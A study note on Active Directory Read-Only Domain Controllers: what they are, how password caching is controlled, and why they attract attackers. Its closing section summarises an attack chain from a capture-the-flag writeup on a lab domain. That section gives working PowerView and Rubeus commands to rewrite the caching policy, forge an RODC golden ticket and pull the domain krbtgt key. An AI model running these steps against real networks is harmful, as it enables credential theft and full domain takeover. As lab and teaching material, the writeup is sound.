# RODC (Read-Only Domain Controller)

## RODC Notes (Read-Only Domain Controller)

### What it is

An RODC is a domain controller that holds a **read-only copy** of the Active Directory database. It was introduced in Windows Server 2008. It can serve logons and directory lookups locally, but it cannot originate changes. All writes go to a writable DC, and changes replicate one way, from the writable DC down to the RODC.

### Why it exists

- **Branch offices, retail stores, and partner sites** often have weak physical security and little local IT oversight.
- A stolen or compromised RODC gives the attacker a copy of the directory, but not the ability to change it.
- Credentials are cached only for accounts you choose, which limits what a compromised box exposes.

### Key features

| Feature | What it does |
| --- | --- |
| **Read-only database** | Local attackers or malware cannot modify objects, groups, or passwords on the RODC. |
| **Password Replication Policy (PRP)** | Controls which accounts may have passwords cached on the RODC. By default, nothing is cached. |
| **Filtered Attribute Set (FAS)** | Blocks sensitive attributes (such as BitLocker recovery keys and LAPS passwords) from replicating to the RODC. |
| **Unidirectional replication** | Changes flow only from a writable DC to the RODC, so local tampering cannot flow back to the forest. |
| **Local admin role separation** | Local staff can manage the server without being Domain Admins. |
| **WAN resilience** | Local users can still log on if the WAN link to headquarters goes down, provided their credentials are cached. |

### Key objects and groups

- **krbtgt_XXXX:** Each RODC has its own krbtgt account, with a number tied to the RODC (for example, `krbtgt_8245`). This is separate from the domain’s main `krbtgt`.
- **Allowed RODC Password Replication Group:** Accounts listed here can have credentials cached on the RODC. Empty by default.
- **Denied RODC Password Replication Group:** Accounts listed here can never have credentials cached. It is pre-populated with privileged accounts such as Domain Admins, Enterprise Admins, and Administrators.
- **RODC Administrators:** Members have administrative rights over the RODC, including changing its configuration.

### Important attributes

| Attribute | Purpose |
| --- | --- |
| `msDS-RevealOnDemandGroup` | The “allow” list for password caching on that RODC. |
| `msDS-NeverRevealGroup` | The “deny” list. Blocks caching for the listed accounts. |

To check these on an RODC:

powershell

```powershell
Get-ADComputer RODC01 -Properties msDS-RevealOnDemandGroup,msDS-NeverRevealGroup
```

### Why RODCs matter for attackers

RODCs are a valuable target because:

- Their **PRP** determines which privileged credentials might be cached locally, so changing it can expose those credentials.
- Their **krbtgt_XXXX** key can forge tickets that the RODC accepts, and in some configurations this leads to the domain’s full krbtgt key.
- **RODC Administrators** membership is a privileged right that is often less monitored than Domain Admins.

### Attack chain from the Garfield writeup (high level)

1. Gain RODC admin rights (add a user to RODC Administrators).
2. Add a controlled account to `msDS-RevealOnDemandGroup` so the target admin’s credentials can be cached.

```powershell
Set-DomainObject -Identity RODC01$ -Set @{
  'msDS-RevealOnDemandGroup'=@(
    'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb',
    'CN=Administrator,CN=Users,DC=garfield,DC=htb'
  )
}
Set-DomainObject -Identity RODC01$ -Clear 'msDS-NeverRevealGroup'
```

1. Dump the RODC’s krbtgt key with Mimikatz.
2. Forge a RODC Golden Ticket with Rubeus.

```powershell
.\Rubeus.exe golden /rodcNumber:<RODC_NUMBER> /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:ticket.kirbi /aes256:<RODC_AES256_KEY> /user:Administrator /id:500 /domain:<DOMAIN> /sid:<DOMAIN_SID>
```

1. Use a KeyList request to get the domain krbtgt key from a writable DC.

```powershell
.\Rubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/garfield.htb /dc:DC01.garfield.htb /ticket:ticket_2026_04_10_22_51_40_Administrator_to_krbtgt@GARFIELD.HTB.kirbi /nowrap
```

1. Dump NTDS.dit and use pass-the-hash for domain takeover.

Note that the writeup’s step with Impacket’s `getST.py` (RBCD via a fake computer account) is a separate technique used to get SYSTEM on the RODC before the key extraction.